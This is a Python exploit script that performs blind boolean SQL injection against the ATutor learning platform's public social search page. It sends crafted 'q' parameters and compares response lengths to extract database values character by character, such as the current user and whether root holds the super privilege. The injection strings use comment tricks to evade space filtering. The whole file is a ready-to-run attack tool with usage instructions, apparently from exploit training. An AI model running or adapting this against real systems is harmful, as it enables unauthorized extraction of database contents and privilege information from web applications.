import requests
import sys

def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        #print(target)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        #print (content_length)
        if (content_length > 20):
            return j
    return None    

def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]

    print("(+) Retrieving privilege type....")

    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/current_user()),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/*/**/from/**/information_schema.user_privileges/**/where/**/grantee/**/like/**/'root'),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test')/**/or/**/(ascii(substring((select/**/super_priv/**/from/**/mysql.user/**/where/**/user/**/=/**/'root'),%d,1)))=[CHAR]%%23" % i
        #injection_string = "test'/**/or/**/(ascii(substring((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee=\"'root'@'localhost'\"/**/and/**/privilege_type='super'),1,1)))=[CHAR]/**/or/**/1='" % i
        injection_string = "test'/**/or/**/(ascii(substring((select/**/privilege_type/**/from/**/information_schema.user_privileges/**/where/**/grantee=\"'root'@'localhost'\"/**/and/**/privilege_type='super'),%d,1)))=[CHAR]/**/or/**/1='" % i
        #print (injection_string)
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")

if __name__ == "__main__":
    main()

